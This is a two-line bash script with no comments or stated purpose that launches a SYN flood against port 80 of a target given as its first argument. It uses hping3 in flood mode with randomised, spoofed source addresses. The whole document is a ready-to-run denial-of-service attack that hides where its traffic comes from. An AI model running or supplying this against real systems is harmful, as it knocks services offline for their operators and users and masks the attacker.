#!/bin/bash
hping3 --flood -S -p 80 --rand-source $1
